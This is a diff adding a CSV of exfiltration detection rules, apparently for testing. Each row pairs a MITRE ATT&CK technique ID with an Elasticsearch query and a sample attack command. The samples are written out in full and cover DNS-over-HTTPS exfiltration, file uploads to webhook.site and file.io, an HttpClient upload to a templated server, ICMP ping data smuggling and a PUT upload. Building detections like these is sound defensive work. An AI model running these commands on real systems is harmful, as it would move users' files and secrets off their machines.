@@ -1,0 +1,117 @@
+﻿T1048,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                    {""match_phrase"": {""CommandLine"": ""Invoke-DNSExfiltrator""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Import-Module $env:Temp\dnsexfil.ps1; 
+Invoke-DNSExfiltrator -i $env:Temp\dnsexfil.ps1 -d target.example.com -p atomic -doh google -t 500 None",2
+T1567,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                    {""wildcard"": {""CommandLine"": ""ConfigSecurityPolicy*""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$path = resolve-path ""c:\ProgramData\Microsoft\Windows Defender\Platform\*\ConfigSecurityPolicy.exe""; 
+& $path[0] c:\temp\config.xml ""https://webhook.site?d=sensitive-data-here""",2
+T1041,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                    {""wildcard"": {""CommandLine"":""*.DefaultRequestHeaders.Add""}},
+                    {""wildcard"": {""CommandLine"": ""*.PostAsync""}},
+                    {""wildcard"": {""CommandLine"": ""*.EnsureSuccessStatusCode""}},
+                    {""match_phrase"": {""CommandLine"": ""System.Net.Http.HttpClient""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$ErrorActionPreference = 'Stop';
+$fieldName = ""#{host.dir.compress}"";
+$filePath = ""#{host.dir.compress}"";
+$url = ""#{server}/file/upload"";
+
+Add-Type -AssemblyName 'System.Net.Http';
+
+$client = New-Object System.Net.Http.HttpClient;
+$content = New-Object System.Net.Http.MultipartFormDataContent;
+$fileStream = [System.IO.File]::OpenRead($filePath);
+$fileName = [System.IO.Path]::GetFileName($filePath);
+$fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+$content.Add($fileContent, $fieldName, $fileName);
+$client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-#{paw}');
+$client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");
+
+$result = $client.PostAsync($url, $content).Result;
+$result.EnsureSuccessStatusCode();",2
+T1048.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                    {""wildcard"": {""CommandLine"": ""Curl*""}},
+                    {""match_phrase"": {""CommandLine"": ""https://file.io""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",C:\Windows\System32\Curl.exe -F 'file=@3945c9_artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/,2
+T1048.003,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                    {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}},
+                    {""match"": {""CommandLine"": ""http://""}},
+                    {""match_phrase"": {""CommandLine"": ""-Method POST""}},
+                    {""match"": {""CommandLine"": ""-Body""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$content = Get-Content C:\Windows\System32\notepad.exe; 
+Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content",2
+T1048.003,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                    {""match_phrase"": {""CommandLine"": ""System.Net.Networkinformation.ping""}},
+                     {""match_phrase"": {""CommandLine"": ""notepad.exe""}},
+                    {""wildcard"": {""CommandLine"": ""*.Send""}}          
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$ping = New-Object System.Net.Networkinformation.ping; 
+foreach($Data in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(""127.0.0.1"", 1500, $Data) }",2
+T1048.003,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                    {""match_phrase"": {""CommandLine"": ""Send-MailMessage""}}          
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Send-MailMessage -From,2
+T1020,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                    {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}},
+                    {""match_phrase"": {""CommandLine"": ""-Method Put""}},
+                    {""match_phrase"": {""CommandLine"": ""-InFile""}},
+                    {""match"": {""CommandLine"": ""-ContentType""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$fileName = ""C:\temp\T1020_exfilFile.txt"";
+$url = ""https://google.com""; 
+$file = New-Item -Force $fileName -Value ""This is ART IcedID Botnet Exfil Test""; 
+$contentType = ""application/octet-stream""; 
+try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",2
